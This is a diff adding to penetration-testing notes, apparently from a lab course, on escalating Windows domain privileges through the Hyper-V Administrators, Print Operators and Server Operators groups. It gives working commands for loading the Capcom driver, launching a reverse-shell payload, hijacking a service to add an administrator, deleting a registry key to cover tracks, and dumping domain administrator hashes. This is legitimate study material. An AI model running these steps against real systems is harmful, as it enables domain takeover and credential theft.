@@ -105,4 +105,86 @@ DNS Admins
 					`Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local`
 				Add a WDAP record 
 					`Add-DnsServerResourceRecordA -Name wpad -ZoneName <domain name>.local -ComputerName dc01.<domain name>.local -IPv4Address <ip>`
-s
+[Hyper-V Administrators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#hyper-v-administrators)
+	Full access to [Hyper-V Features](https://learn.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines)
+	If the DC is visualised then they should be considered domain admins
+		Make a clone of the DC 
+		[Exploit](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/) using 
+			[CVE-2018-0952](https://www.exploit-db.com/exploits/45244)
+			[CVE-2019-0841](https://www.exploit-db.com/exploits/46683)
+	Target File
+		Update this [exploit](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) to grant full user permissions on a file
+		Take ownership of the file:
+			`takeown /F <file path>
+		Replace the file with malicious version of the file
+			`sc.exe start <malicous file>`
+		PRE MARCH 2020
+[Print Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#print-operators)
+	SeLoadDriverPrivilige
+		Manage, create, share and delete printers. 
+		Capcom.sys 
+			Allow any user to execute shell code with SYSTEM privileges. 
+			Load the [driver](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp)
+			Download it locally and edit:
+				Whoami /priv
+					If SeLoadDriver is not present need to bypass [UAC](https://github.com/hfiref0x/UACME) or load CMD as admin
+				Paste:
+					```#include <windows.h>
+					#include <assert.h>
+					#include <winternl.h>
+					#include <sddl.h>
+					#include <stdio.h>
+					#include "tchar.h"```
+				Compile with cl.exe
+					`cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp`
+				[Download](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) and save to C:\temp.
+				Add reference to driver
+					`reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
+					`reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1`
+				Verify Driver is not loaded using [DriverView](http://www.nirsoft.net/utils/driverview.html)
+					`.\DriverView.exe /stext drivers.txt
+					`cat drivers.txt | Select-String -pattern Capcom`
+				Verify Privilege is Enabled 
+					`EnableSeLoadDriverPrivilege.exe`
+				Verify Capcom Driver is listed
+					`.\DriverView.exe /stext drivers.txt
+					`cat drivers.txt | Select-String -pattern Capcom`				
+				Use [ExploitCampcom.exe](https://github.com/tandasat/ExploitCapcom) to escalate privileges.
+					GUI
+						`.\ExploitCapcom.exe`
+					NO GUI 
+						Modify campcom.cpp before compiling.
+							Edit line 292 and replace C:\\Windows\\ System32\\cmd.exe with a msfvenom reverseshell.exe
+						`TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");`
+		Automating [EopLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/)
+			`EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
+	Cover tracks
+		Remove Registry Key
+			`reg delete HKCU\System\CurrentControlSet\Capcom`
+[Server Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-serveroperators)
+	Allows members to administer servers without needed domain admin
+	SeBackupPrivilige 
+	SeRestorePrivilige 
+	Exploit these privileges to control local services: 
+		Query the app readiness service
+			`sc qc AppReadiness`
+			Check run as Local System
+		Check Service Permissions using PsService
+			`<Directory>\PsService.exe security AppReadiness`
+			SERVICE_ALL_ACCESS ? Full control over service. 
+			ALLOW NT AUTHORITY\ SYSTEM
+		Check Local Admin Group 
+			`net localgroup Administrators`
+		Modify the Service Binary Path 
+			`sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"`
+		Start the Service 
+			`sc start AppReadiness`
+		Confirm Admin Access 
+			`net localgroup Administrators`
+		Confirm Local Admin access on DC
+			on kali machine:
+			`crackmapexec smb <IP> -u server_adm -p <password>`
+		 Retrieve NTLM hashes from DC 
+			 on Kali:
+			`secretsdump.py server_adm<IP> -just-dc-user administrator`
+			
